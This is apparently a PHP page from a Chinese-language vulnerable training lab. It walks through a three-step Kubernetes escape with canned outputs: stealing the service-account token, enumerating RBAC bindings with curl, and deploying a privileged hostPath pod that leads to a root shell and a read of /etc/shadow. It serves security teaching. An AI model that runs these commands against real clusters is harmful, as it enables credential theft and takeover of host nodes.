<?php
$ACTIVE = array_fill(0, 250, '');
$ACTIVE[140] = 'active open';
$ACTIVE[207] = 'active';
$ACTIVE[140] = 'active open';
$ACTIVE[207] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$k8s_output = "";
$step_done = 0;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['k8s_action'] ?? '';
    
    if ($action === 'read_token') {
        $step_done = 1;
        $k8s_output = "=== [cat /var/run/secrets/kubernetes.io/serviceaccount/token] ===\n\n" .
                      "eyJhbGciOiJSUzI1NiIsImtpZCI6Il9rOHNfMiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6IndlYi1wb2QtdG9rZW4tc3VwZXJhZG1pbiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OndlYi1wb2QifQ.SIGNATURE_K8S_FLAG_SECRET_123456";
    } else if ($action === 'check_auth') {
        $step_done = 2;
        $k8s_output = "=== [curl -k -H \"Authorization: Bearer <token>\" https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings] ===\n\n" .
                      "HTTP/2 200 OK\nContent-Type: application/json\n\n" .
                      "{\n  \"kind\": \"ClusterRoleBinding\",\n  \"metadata\": { \"name\": \"web-pod-overprivileged-binding\" },\n  \"roleRef\": { \"apiGroup\": \"rbac.authorization.k8s.io\", \"kind\": \"ClusterRole\", \"name\": \"cluster-admin\" },\n  \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"web-pod\", \"namespace\": \"default\" } ]\n}\n\n[WARNING] Critical Misconfiguration Detected: ServiceAccount 'web-pod' is bound to 'cluster-admin'! You have full control over the entire K8s cluster!";
    } else if ($action === 'escape_node') {
        $step_done = 3;
        $k8s_output = "=== [POST https://kubernetes.default.svc/api/v1/namespaces/default/pods - Deploy Privileged Pod] ===\n\n" .
                      "Pod 'attacker-host-mount' created successfully.\n" .
                      "Waiting for container to start... Running!\n\n" .
                      "=== [exec -it attacker-host-mount -- chroot /host /bin/bash] ===\n\n" .
                      "root@k8s-master-node-01:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\n" .
                      "root@k8s-master-node-01:/# cat /etc/shadow | head -n 2\n" .
                      "root:\$6\$a9131757\$z9Y8X...FLAG{K8S_SERVICEACCOUNT_TOKEN_PRIVILEGED_POD_ESCAPE}:19000:0:99999:7:::\n" .
                      "daemon:*:19000:0:99999:7:::\n\n" .
                      "[🚀 ESCAPE SUCCESSFUL] You have escaped from the unprivileged web pod to the K8s master node root shell!";
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="dockerlab_check.php">Docker Lab</a></li>
                <li class="active">Kubernetes 越权逃逸</li>
            </ul>
        </div>
        <div class="page-content">
            <div class="vul info">
                <h2>☸️ Kubernetes ServiceAccount Token 越权与集群逃逸 (K8s Escape)</h2>
                <p>在 Kubernetes (K8s) 容器编排架构中，每个 Pod 默认都会在 <code>/var/run/secrets/kubernetes.io/serviceaccount/</code> 目录下自动挂载用于与 API Server 通信的凭证证书与 Token（除非开发者显式设置 <code>automountServiceAccountToken: false</code>）。</p>
                <p>当运维人员为了方便让 Pod 调用 K8s API（例如 CI/CD 构建、自动监控部署）而赋予了该 ServiceAccount 过大的 RBAC 权限（如绑定了 <code>cluster-admin</code> 角色或允许 <code>create pods</code> / <code>exec</code>），攻击者在通过 Web 漏洞（如 RCE 或 SSRF）控制此 Pod 后，便可直接窃取 Token 发起集群内越权，<b>创建特权容器挂载宿主机根目录，直接夺取 K8s 母机宿主机 Root 控制权！</b></p>
                
                <hr/>
                <div class="row">
                    <div class="col-md-5">
                        <h4><i class="fa fa-crosshairs"></i> 容器逃逸三步法互动模拟器</h4>
                        <form method="POST">
                            <div class="list-group">
                                <button type="submit" name="k8s_action" value="read_token" class="list-group-item <?php echo $step_done==1?'active':''; ?>">
                                    <h4 class="list-group-item-heading"><i class="fa fa-file-text-o"></i> 步骤 1：窃取容器内挂载的 ServiceAccount Token</h4>
                                    <p class="list-group-item-text">执行 <code>cat /var/run/secrets/.../token</code> 获取 K8s API 凭证。</p>
                                </button>
                                <button type="submit" name="k8s_action" value="check_auth" class="list-group-item <?php echo $step_done==2?'active':''; ?>" style="margin-top:8px;">
                                    <h4 class="list-group-item-heading"><i class="fa fa-search"></i> 步骤 2：枚举 RBAC 权限与角色绑定</h4>
                                    <p class="list-group-item-text">调用 API Server 枚举 ClusterRoleBindings，探测是否存在越权配置。</p>
                                </button>
                                <button type="submit" name="k8s_action" value="escape_node" class="list-group-item <?php echo $step_done==3?'active':''; ?>" style="margin-top:8px; background-color:#d9534f; color:#fff;">
                                    <h4 class="list-group-item-heading"><i class="fa fa-external-link"></i> 步骤 3：部署特权 Pod 挂载根目录完成逃逸！</h4>
                                    <p class="list-group-item-text" style="color:#ffe;">调用 API 创建一个开启 <code>privileged: true</code> 且挂载 <code>hostPath: /</code> 的恶意 Pod 并进入 Root Shell。</p>
                                </button>
                            </div>
                        </form>
                    </div>
                    <div class="col-md-7">
                        <h4><i class="fa fa-terminal"></i> Pod 与 API Server 交互控制台输出</h4>
                        <div style="background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 4px; font-family: monospace; min-height: 260px; max-height: 480px; overflow-y: auto;">
                            <?php if (!empty($k8s_output)) {
                                echo "<pre style='background:transparent; color:#50fa7b; border:none; margin:0; padding:0;'>" . htmlspecialchars($k8s_output) . "</pre>";
                            } else { ?>
                                <span style="color: #6a9955;">// [Current Shell: www-data@web-pod-799d85489-x2p8t:/var/www/html]</span><br/>
                                <span style="color: #6a9955;">// 请在左侧依次按顺序点击步骤 1、2、3，模拟体验从一个普通 Web 容器彻底沦陷并控制整个 K8s 集群的过程！</span>
                            <?php } ?>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>


